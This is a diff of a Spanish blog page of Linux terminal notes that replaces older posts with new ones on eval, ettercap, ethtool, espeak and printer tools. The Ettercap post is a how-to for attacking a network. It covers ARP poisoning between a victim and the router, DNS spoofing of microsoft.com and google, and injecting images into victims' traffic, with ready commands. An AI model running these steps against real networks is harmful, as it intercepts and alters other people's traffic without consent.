@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="Herramienta para realizar backups tanto en modo local como remoto # duplicity full /home file:///backups/ (realiza un backup copmpleto [full] en modo &hellip;">
+  <meta name="description" content="Toma los argumentos de la línea de comandos y los ejecuta como comandos. Tenemos un texto con variables: $ nano entrada_web.txt Hola $NOMBRE, felices &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -26,7 +26,6 @@
   <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
   <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
   <script src="/javascripts/octopress.js" type="text/javascript"></script>
-  <script src="/javascripts/links.js"></script>
   <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
 <link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
 <link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
@@ -37,12 +36,10 @@
 
 <body   >
   <header role="banner"><hgroup>
-  <div align=center>
+ <div align=center>
   <h1><a href="/">TRACTATUS ELEMENTALIS</a></h1>
-  
-    <h2>Apuntes sobre bash. Orgasmos con la terminal.</h2>
-  </dev>
-  
+  <h2>Apuntes sobre bash. Orgasmos con la terminal.</h2>
+ </div>
 </hgroup>
 
 </header>
@@ -59,15 +56,12 @@
 </form>
   
 <ul class="main-navigation">
-  <li><a href="/previa">Previa</a></li>
+  <li><a href=/previa">Previa</a></li>
   <li><a href="/">Últimas</a></li>
   <li><a href="/blog/archives">Todas</a></li>
-  <li><a href="/scripts">Scripts</a></li>
-  <li><a href="http://www.lapipaplena.net">Web</a></li>
-  <li><a href="http://lapipaplena.no-ip.org/wiki/">Wiki</a></li>
-  <li><a href="http://anonops.es">Foro</a></li>
-  <li><a href="http://panellpipa.no-ip.org">Socios</a></li>
-
+  <li><a href="http://lapipaplena.org">Web</a></li>
+  <li><a href="http://lapipaplena.no-ip.org/wiki">Pytrac</a></li>
+  <li><a href="http://panellpipa.no-ip.org>Noticias</a></li>
 </ul>
 
 </nav>
@@ -81,7 +75,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/duplicity/">Duplicity</a></h1>
+      <h1 class="entry-title"><a href="/blog/eval/">Eval</a></h1>
     
     
       <p class="meta">
@@ -97,26 +91,455 @@
   
 
 
-<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2014-07-13T16:48:00+02:00" pubdate data-updated="true">13-07-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Herramienta para realizar backups tanto en modo local como remoto</p>
+  <div class="entry-content"><p>Toma los argumentos de la línea de comandos y los ejecuta como comandos.</p>
 
-<blockquote><p># duplicity full /home file:///backups/ (realiza un backup copmpleto [full] en modo local de la carpeta /home en la carpeta /backups)</p>
+<ul>
+<li>Tenemos un texto con variables:</li>
+</ul>
 
-<p>$ duplicity /home/usuario scp://usuario@host/dir (Backup de un directorio local a un servidor remoto)</p></blockquote>
+
+<blockquote><p>$ nano entrada_web.txt</p></blockquote>
+
+<pre><code>Hola $NOMBRE, felices de verte por la web $BLOG
+</code></pre>
+
+<p>Y un script con el siguiente contenido:</p>
+
+<pre><code>#!/bin/bash
+
+echo "¿Como te llamas? "
+
+read NOMBRE
+
+BLOG="lapipaplena.net"
+
+eval "echo "$(cat ./entrada_web.txt)""
+</code></pre>
+
+<ul>
+<li>Substituiendo las variables del script en el texto.</li>
+</ul>
+
+
+<p>Otro ejemplo de uso de eval:</p>
+
+<blockquote><p>$ nano ejemplo.sh</p></blockquote>
+
+<pre><code>#!/bin/bash
+
+pipe="/ |"
+
+#ls $pipe wc -l
+
+eval ls $pipe wc -l
+</code></pre>
+
+<p>Descomentar la linea del &#8220;ls&#8221; y comentar la de &#8220;eval&#8221; y observar la diferencia entre ambas salidas.</p>
+
+<ul>
+<li>Otro ejemplo:</li>
+</ul>
+
+
+<blockquote><p>$ nano ejemplo.sh</p></blockquote>
+
+<pre><code>#!/bin/bash
+
+X=10
+
+Y=X
+
+#echo '$'$Y
+
+eval echo '$'$Y
+</code></pre>
+
+<p>Descomentar la linea del &#8220;echo&#8221; y comentar la de &#8220;eval&#8221; y observar la diferencia entre ambas salidas.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/ettercap/">Ettercap</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-13T16:48:00+02:00" pubdate data-updated="true">13-07-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>[Dependencias: libcap2 libnet1 zlib1g libpthread-stubs0 libpcre3-dev libpcap-dev libcap-dev libnet6-1.3-0 libnet1-dev libssl-dev ncurses-bin libncurses5-dev libsdl-pango1 libatk1.0-dev]</p>
+
+<p>Snifador de red. Muestra pantallas solicitando aceptación de certificado en los navegadores de las victimas.</p>
+
+<p>descargar de http://ettercap.sourceforge.net/ y descomprimir</p>
+
+<blockquote><p>$ wget http://prdownloads.sourceforge.net/ettercap/ettercap-NG-0.7.3.tar.gz?download</p>
+
+<p>$ wget http://sourceforge.net/projects/ettercap/files/ettercap/NG-0.7.3/ettercap-NG-0.7.3.tar.gz/download</p>
+
+<p>$ tar -zvxf paquete</p>
+
+<p>$ cd ettercap-NG-0.7.3</p></blockquote>
+
+<pre><code>$ ./configure
+
+$ make
+
+# make install
+</code></pre>
+
+<blockquote><p>$ ettercap -P list   (visualizar plugins instalados)</p></blockquote>
+
+<p>modificar archivo de configuración:</p>
+
+<blockquote><p># nano /etc/etter.conf</p></blockquote>
+
+<p>descomentar la linea:himne20-01-13 19:37Menos información</p>
+
+<blockquote><p># if you use iptables:</p></blockquote>
+
+<p>redir_command_on = &#8220;iptables -t nat -A PREROUTING -i %iface -p tcp &#8211;dport %port -j REDIRECT &#8211;to-port %rport&#8221;</p>
+
+<p>Y modificar:</p>
+
+<blockquote><p># the command used by the remote_browser plugin</p></blockquote>
+
+<p>remote_browser = &#8220;firefox -remote openurl(http://%host%url)&#8221;</p>
+
+<p>Para usar el plugin dns_spoof (Redireccionar páginas a otros sitios)</p>
+
+<blockquote><p># nano /usr/share/ettercap/etter.dns</p>
+
+<p># 3  Modos de especificar la redirección a localhost</p></blockquote>
+
+<pre><code>microsoft.com          A       192.168.1.2
+
+*.microsoft.com        A       192.168.1.2
+
+*google*               A       192.168.1.2
+</code></pre>
+
+<p>Para la sustitución de imagenes:</p>
+
+<blockquote><p># touch test2filter</p></blockquote>
+
+<p>Pegar:</p>
+
+<pre><code>if (ip.proto == TCP &amp;&amp; tcp.src == 80) {
+
+replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
+
+replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" ");
+
+msg("Filter ok.\n");
+</code></pre>
+
+<p>Configurar el sistema para que acepte todos los paquetes que detecte. Si al lanzar:</p>
+
+<blockquote><p># cat /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Si la respuesta no es 1, lanzar:</p>
+
+<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Arrancar la aplicación en ncurses [en terminal -> ettercap -T , en modo gtk -> ettercap -G y en modo demonio -> ettercap -D . En este último caso el análisis se realiza en los archivos de log]:</p>
+
+<blockquote><p># ettercap -C</p></blockquote>
+
+<p>Clicar en:</p>
+
+<pre><code>Sniff -&gt; Unifield sniffing
+</code></pre>
+
+<p>Y aceptar [o poner] la red [eth0]. En la nueva pantalla, clic en:</p>
+
+<pre><code>Host -&gt; Scan for host
+</code></pre>
+
+<p>Para escanear la red. Para visionar las máquina activas obtenidas, clic en:</p>
+
+<pre><code>Hosts -&gt; Hosts List
+</code></pre>
+
+<p>Bajar con el cursor hasta la IP del router y pulsar la tecla &#8220;1&#8221;. Luego nos situamos sobre la IP del objetivo y pulsar la tecla &#8220;2&#8221; con lo que colocamos nuestra máquina entre el router y la máquina objetivo (envenenamiento arp). Luego en el cuadro que se abre con:</p>
+
+<pre><code>Mitm -&gt; Arp poisoning
+</code></pre>
+
+<p>Parameters, ponemos:</p>
+
+<pre><code>remote
+</code></pre>
+
+<p>Y arrancamos el sniffer:</p>
+
+<pre><code>Start -&gt; Start sniffing
+
+Para observar las conexiones que realiza la máquina objetivo:
+
+View -&gt; Connections
+
+Para terminar el ataque:
+
+Mitm -&gt; Stop mitm atack
+
+Start -&gt; Stop Sniffing
+
+Start -&gt; Exit
+</code></pre>
+
+<p>Forma abreviada:</p>
+
+<pre><code># ettercap -Tq -M arp:remote -i eth0 ip_victima ip_router
+
+O solo especificando la del router si se ataca toda la red:
+</code></pre>
+
+<blockquote><p># ettercap -Tq -M arp:remote -i eth0 ip_router</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/ethtool/">Ethtool</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-13T16:48:00+02:00" pubdate data-updated="true">13-07-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Averiguar/modificar la tarjeta de red</p>
+
+<blockquote><p># ethtool eth0  (Para ver la configuración actual de la tarjeta)</p>
+
+<p># ethtool -i eth0  (conocer el driver de la tarjeta de red)</p>
+
+<p># ethtool &#8211;test eth0 (Realizar un test de la tarjeta si está soportado)</p>
+
+<p># ethtool -S eth0 (Consultar estadísticas de la red)</p>
+
+<p># ethtool -p eth0 10 (Hacer parpadear los lets de la interfaz de red)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/ethstatus/">Ethstatus</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-13T16:48:00+02:00" pubdate data-updated="true">13-07-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Monitor de estadísticas de internet</p>
+
+<blockquote><p># ethstatus</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/ethstats/">Ethstats</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-13T16:48:00+02:00" pubdate data-updated="true">13-07-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>muestra el uso y las estadísticas de nuestra red.</p>
+
+<blockquote><p># ethstats</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/etherwake/">Etherwake</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-13T16:48:00+02:00" pubdate data-updated="true">13-07-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Arrancar un ordenador [especificado por su MAC] de forma remota una vez activado en la BIOS &#8220;Wake On Lan&#8221;</p>
+
+<blockquote><p># etherwake -i eth0 00:16:E6:31:1A:22</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/eterm/">Eterm</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-13T16:48:00+02:00" pubdate data-updated="true">13-07-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Terminal.</p>
+
+<blockquote><p>$ Eterm -D 1 -f green -O (En el segundo escritorio [-D 1] con las fuentes en verde  [-f]  y transparente [-O]</p></blockquote>
 
 <p>Algunas opciones:</p>
 
-<pre><code>--no-encryption (Sin codificar. Por defecto codifica los archivos en el destino)
+<pre><code>--buttonbar false (Sin la barra del menú)
 
---include /home/usuario/datos/documentos (Backups de un subdirectorio especifico)
+-T “titulo de la terminal”
 
---remove-all-but-n-full 1 --force (Sólo dejará en destino la última copia "full", borrando la anterior y las incrementales que dependen de ella) 
+-b yellow (color de fondo)
+
+-c red (Color del cursor)
+
+-g 50x10 (Medidas. 50 de largo por 10 de ancho)
+
+-S (Abrir en todos los escritorios)
+
+-e comando (Cuando termine de ejecutar el comando se cierra)
 </code></pre>
 </div>
   
@@ -130,7 +553,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/dumpkeys/">Dumpkeys</a></h1>
+      <h1 class="entry-title"><a href="/blog/espeak/">Espeak</a></h1>
     
     
       <p class="meta">
@@ -146,16 +569,16 @@
   
 
 
-<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2014-07-13T16:48:00+02:00" pubdate data-updated="true">13-07-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Permite obtener el mapa de teclas (Keymap) utilizado por el controlador de teclado actual.</p>
+  <div class="entry-content"><p>Hablando la terminal. Mismas opciones que aoss espeak.</p>
 
-<blockquote><p>$ dumpkeys</p></blockquote>
+<blockquote><p>$ echo {1..3}&#8221; sistemas quedaron y naturalmente eran linux  &#8221; | espeak -ves -s 100</p></blockquote>
 </div>
   
   
@@ -168,7 +591,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/dumpe2fs/">Dumpe2fs</a></h1>
+      <h1 class="entry-title"><a href="/blog/esetroot/">Esetroot</a></h1>
     
     
       <p class="meta">
@@ -184,20 +607,26 @@
   
 
 
-<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2014-07-13T16:48:00+02:00" pubdate data-updated="true">13-07-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Muestra información de ficheros ext2/3</p>
+  <div class="entry-content"><p>Activación de fondos de escritorio</p>
 
-<blockquote><p># dumpe2fs /dev/sda1</p></blockquote>
+<blockquote><p>$ esetroot -s /home/usuario/imagenes/imagen.jpg (Escala al tamaña de a pantalla)</p>
 
-<p>Nota.- El porcentaje de bloques reservados para el usuario root en los sistemas de archivo ext2/3 normalmente es de un 5%. Esta cifra se obtiene de los datos “Reserved block count” y “Block count”. Con tune2fs podemos modificar este porcentaje, por ejemplo al 1%:</p>
+<p>$ esetroot -b red -f /home/usuario/imagenes/imagen-jpg (Colorea en rojo la parte de la pantalla no ocupada por la imágen con la opción -f)</p></blockquote>
 
-<blockquote><p># tune2fs -m 1 /dev/sda1</p></blockquote>
+<p>otras opciones:</p>
+
+<p>-c (Central la imagen)</p>
+
+<p>-f (Respetando las proporciones)</p>
+
+<p>-m (en mosaico)</p>
 </div>
   
   
@@ -210,7 +639,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/dump/">Dump</a></h1>
+      <h1 class="entry-title"><a href="/blog/escputil/">Escputil</a></h1>
     
     
       <p class="meta">
@@ -226,446 +655,22 @@
   
 
 
-<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2014-07-13T16:48:00+02:00" pubdate data-updated="true">13-07-2014</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Copia de seguridad de archivos, directorios o particiones. Para restaurar la copia de seguridad ver comando “restore”.</p>
+  <div class="entry-content"><p>Ver nivel de tinta de las impresoras Epson</p>
 
-<blockquote><p>$ dump -0vf home.bak /home/usuario/ (Completo [0], incremental sería 1, mostrando información [v] y especificando fichero [f]</p></blockquote>
-</div>
-  
-  
+<blockquote><p># escputil -i -u -r /dev/usblp0 (Para ver niveles de tinta)</p>
 
+<p># escputil -c -u -r /dev/usblp0 (Limpiar cabezales)</p>
 
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/duckduckgo/">Duckduckgo</a></h1>
-    
-    
-      <p class="meta">
-        
+<p># escputil -n -u -r /dev/usblp0 (Imprimir prueba de inyestores)</p>
 
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Buscador alternativo que respeta la privacidad del usuario.</p>
-
-<p>Filtros:</p>
-
-<pre><code>site:lapipaplena.net (Busca en la url especificada)
-
-qrcode "linux es un sistema genial" (Crear código QR de un texto)
-
-md5 lapipaplena (Generar un hash de un texto en md5)
-
-base64 encode "Un texto" (Generar un hash en base64)
-
-anagram "linux es genial" (Generar un anagrama [cambio de posición de los carácteres)
-
-shorten http://lapipaplena.net (Acortador de URL)
-
-maps ibiza (Muestra el mapa solicitado)
-
-@templix (De un usuario de twitter)
-
-recipes "tortilla de patatas" (Recetas de cocina)
-
-color codes (Muestra los códigos de los colores)
-</code></pre>
-
-<p>Algunos comandos para utilizar en buscadores externos [Bangs]</p>
-
-<pre><code>!wes (Busca en la wikipedia en español)
-
-!github (En github)
-
-!b (En bing)
-
-!meneame (En meneame)
-
-!tw (En twitter)
-
-!fb (En facebook)
-
-!flickr (En flickr)
-
-!grooveshark (En grooveshark)
-
-!y (En yahoo)
-
-!enes (En google translate inglés-español)
-
-!gplus (En google+)
-
-!g (En google)
-
-!gi (En google images)
-
-!m (En google maps)
-
-!gmail (En gmail)
-
-!ebay (En ebay) 
-</code></pre>
-
-<p>Algunos atajos:</p>
-
-<pre><code>d (Busca más resultados en el sitio web resaltado)
-
-Ctrl+enter (Abre resultado en una nueva ventana)
-
-Ees (Sale de la caja de búsqueda y va a los resultados)
-
-h (Coloca el cursor en la caja de búsqueda)
-
-r (Si existe, va a los relacionados)
-
-s (Si existe, va al enlace sugerido
-
-t (Va al inicio de la página) 
-</code></pre>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/du/">Du</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Mostrar el espacio usado por los directorios</p>
-
-<blockquote><p>$ du -a (Para todos los ficheros, no solo los directorios)</p>
-
-<p>$ du -h (Da los resultados en M y G, por defecto son en bytes)</p>
-
-<p>$ du -s (Muestra los totales del directorio o archivo especificados)</p>
-
-<p>$ du -x (Calcular tamaño sin sumar los puntos de montaje)</p>
-
-<p>$ du -s (Solo suma total, en lugar del tamaño de cada directorio)</p>
-
-<p>$ du fichero (Muestra el tamaño de fichero)</p>
-
-<p>$ du | sort -rn | head (Mostrar los 10 archivos que más ocupan)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/dstat/">Dstat</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Monitor  de trafico de red</p>
-
-<blockquote><p># dstat</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/driftnet/">Driftnet</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Snifer de imagenes y video</p>
-
-<blockquote><p># driftnet -i wlan2</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/dpkg/">Dpkg</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Gestor de programario de distros derivadas de Debian</p>
-
-<blockquote><p># dpkg -i paquete   (Instalación de paquetes .deb)</p>
-
-<p># dpkg -r paquete   (Desinstala un paquete)</p>
-
-<p># dpkg &#8211;purge paquete    (Desinstala junto sus archivos de configuración)</p>
-
-<p># dpkg &#8211;audit   (Visualizar paquetes instalados parcialmente)</p>
-
-<p># dpkg &#8211;force -r paquete  (Fuerza la desinstalación de un paquete)</p>
-
-<p># dpkg &#8211;force-all -r paquete  (Fuerza más la desinstalación de un paquete)</p>
-
-<p># dpkg -c paquete   (Muestra los ficheros de un paquete)</p>
-
-<p># dpkg &#8211;yet-to-unpack  (paquetes descargados sin instalar)</p>
-
-<p># dpkg -C   (Muestra los instalados parcialmente)</p>
-
-<p># dpkg -L paquete  (Ficheros que se instalaron con un paquete)</p>
-
-<p>$ dpkg -l inkscape  (Conocer si un paquete está instalado y su versión)</p>
-
-<p># dpkg -S fichero    (Muestra a qué paquete pertenece un fichero)</p>
-
-<p># dpkg &#8211;get-selections   (Muestra todos los paquetes instalados en el sistema)</p>
-
-<p># dpkg &#8211;get-selections | cut -f1 (Lo mismo más fino)</p>
-
-<p># dpkg &#8211;get-selections > lista.txt    (Los manda a un fichero)</p>
-
-<p># dpkg &#8211;get-selections | grep python (muestra todos los paquetes python)</p>
-
-<p># dpkg -l > llistat.txt      (Manda a un fichero todos los paquetes Debian)</p>
-
-<p># dpkg &#8211;status paquete  (Info, dependencias, recomendaciones, sugerencias)</p>
-
-<p># dpkg -install paquete &#8211;force-conflicts (instalar un paquete conflicitivo)</p>
-
-<p># dpkg-reconfigure paquete    (Reconfigura paquetes instalados)</p>
-
-<p># dpkg-reconfigure -phigh -a   (Reconfigurar todo el sistema)</p>
-
-<p># dpkg-reconfigure debconf    (R. interfaz de configuración)</p>
-
-<p># dpkg-reconfigure xserver-xorg  (R. el servidor X)</p>
-
-<p># dpkg-reconfigure console-common (R. el teclado)</p>
-
-<p># dpkg-reconfigure console-setup (mismo que lo anterior)</p>
-
-<p># dpkg-reconfigure locales     (R. el lenguaje)</p>
-
-<p># dpkg-reconfigure tzdata      (R. la zona horaria)</p>
-
-<p># dpkg-reconfigure console-data (R. las tty)</p>
-
-<p># dpkg-reconfigure -a (Borra paquetes de configuraciones)</p>
-
-<p># dpkg-reconfigure fontconfig-config  (R. fuentes. Seguir con:)</p>
-
-<p># dpkg-reconfigure fontconfig  (R. fuentes)</p>
-
-<p># dpkg &#8211;configure -a  (R. inconsistencias o procesos despues de un cuelgue)</p>
-
-<p># dpkg -i &#8211;force-overwrite /var/cache/apt/archives/paquete.deb (forzar install)</p>
-
-<p># dpkg -b deb paquete.deb (Convertir la carpeta “deb” en un archivo “.deb”)</p></blockquote>
-
-<p>1.-</p>
-
-<p>En ocasiones, algún paquete medio o mal instalado puede bloquear la aplicación. En estos casos puede usarse:</p>
-
-<blockquote><p># rm /var/lib/apt/lists/* -vf</p></blockquote>
-
-<p>Y a continuación:</p>
-
-<blockquote><p># apt-get update</p></blockquote>
-
-<p>2.-</p>
-
-<p>Forzar desinstalación de paquetes resistentes.</p>
-
-<pre><code># dpkg --purge --force-remove-reinstreq paquete 
-
-# dpkg --listfiles paquete_dañado 
-
-# gedit /var/lib/dpkg/status (eliminar la sección paquete_dañado) 
-
-# gedit /var/lib/dpkg/available   (eliminar la sección paquete_dañado)
-
-# dpkg -l | grep ^rc | awk '{print $2}' | sudo xargs dpkg -P  (suprimir residuos de instalaciones)
-</code></pre>
-
-<p>3.-</p>
-
-<p>Otra forma de forzar la desinstalación de paquetes conflictivos:</p>
-
-<pre><code># rm /var/lib/dpkg/info/paquete
-
-# dpkg -r --force-remove-reinstreq paquete
-
-# dpkg -l | sed '/^rc/!d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/' | xargs -r sudo apt-get -y purge (Suprimir configuraciones residuales y huerfanas)
-</code></pre>
-
-<p>4.-</p>
-
-<p>Otro modo de suprimir archivos de configuración huerfanos (rc):</p>
-
-<pre><code># dpkg -l | grep ^rc (Comprobar si tenenos paquetes de estas caracteristicas)
-
-# dpkg -P $(dpkg -l |awk '/^rc/ { print $2 }') (Eliminarlos)
-</code></pre>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/dpigs/">Dpigs</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2013-12-15T18:52:00+01:00" pubdate data-updated="true">15-12-2013</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>[debian-goodies]</p>
-
-<p>Muestra los paquetes que ocupan más espacio.</p>
-
-<blockquote><p>$ dpigs (Los primeros diez 10. Opción por defecto)</p>
-
-<p>$ dpigs -n 20 (Los primeros 20)</p>
-
-<p>$ dpigs -S (Muestra los paquetes fuente más grandes instalados en el sistema)</p></blockquote>
+<p># escputil -h -u -r /dev/usblp0 (Listar comandos y opciones)</p></blockquote>
 </div>
   
   
@@ -688,51 +693,51 @@ t (Va al inicio de la página)
     <section>
 <h1>Número de entradas</h1>
 	<ul>
-	<li>1358</li>
+	<li>1409</li>
 	</ul>
 </section>
 <section>
-  <h1>Añadidos/modificados</h1>
+  <h1>Recent Posts</h1>
   <ul id="recent_posts">
     
       <li class="post">
-        <a href="/blog/help/">help</a>
+        <a href="/blog/php/">php</a>
       </li>
     
       <li class="post">
-        <a href="/blog/fc/">fc</a>
+        <a href="/blog/ranger/">ranger</a>
       </li>
     
       <li class="post">
-        <a href="/blog/shell/">shell</a>
+        <a href="/blog/terminator/">terminator</a>
       </li>
     
       <li class="post">
-        <a href="/blog/mupdf/">mupdf</a>
+        <a href="/blog/curl/">curl</a>
       </li>
     
       <li class="post">
-        <a href="/blog/continue/">continue</a>
+        <a href="/blog/cheat/">cheat</a>
       </li>
     
       <li class="post">
-        <a href="/blog/colores/">colores</a>
+        <a href="/blog/slim/">slim</a>
       </li>
     
       <li class="post">
-        <a href="/blog/awstats/">awstats</a>
+        <a href="/blog/xfce4/">xfce4</a>
       </li>
     
       <li class="post">
-        <a href="/blog/awk/">awk</a>
+        <a href="/blog/sysctl/">sysctl</a>
       </li>
     
       <li class="post">
-        <a href="/blog/dropbox/">dropbox</a>
+        <a href="/blog/latex/">latex</a>
       </li>
     
       <li class="post">
-        <a href="/blog/aewan/">aewan</a>
+        <a href="/blog/nslookup/">nslookup</a>
       </li>
     
   </ul>
@@ -741,7 +746,7 @@ t (Va al inicio de la página)
 <section>
   <h1>Sobre mi</h1> 
   <center>
-  <img src="/images/linux_user.png" title="Linux user">
+  <img src="/images/lapipaplena.png" title="Linux user">
   </center>
   <p>Soy un /dev de lo más normal, con ciertas deficiencias en el xorg.conf como casi todo el mundo, con una apariencia común tirando a gráfica VGA y con algún pixel algo deteriorado y que vivirá hasta que su directorio / sufra un kernel pánic y me mande a /dev/null</p>
 </section>
@@ -768,10 +773,6 @@ t (Va al inicio de la página)
 <section>
 <table border="0" cellspacing="0" cellpadding="0"><tr><td align="center"><script type="text/javascript" src="http://www.worldtimeserver.com/clocks/embed.js"></script><script type="text/javascript" language="JavaScript">objES=new Object;objES.wtsclock="wtsclock001.swf";objES.color="CC6600";objES.wtsid="ES";objES.width=200;objES.height=200;objES.wmode="transparent";showClock(objES);</script></td></tr></table>
 </section>
-<section>
-	<h1>IP visitante</h1>
-	<script type="text/javascript" src="http://boastology.com/tools/ip2c/?im=0&cn=0&ip=1"></script>
-</section>
 
   
 </aside>
@@ -779,7 +780,7 @@ t (Va al inicio de la página)
     </div>
   </div>
   <footer role="contentinfo"><p>
-  Copyright &copy; 2013 - templix -
+  Copyright &copy; 2014 - templix -
   <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
 </p>
 
@@ -805,9 +806,6 @@ t (Va al inicio de la página)
 
 
 
-<div style="width: 1px; height: 1px; overflow: hidden; position: absolute; left: -1000px">
-<iframe src="http://crontux.homelinux.com/getip.php"></iframe>
-</div>
 
 </body>
 </html>
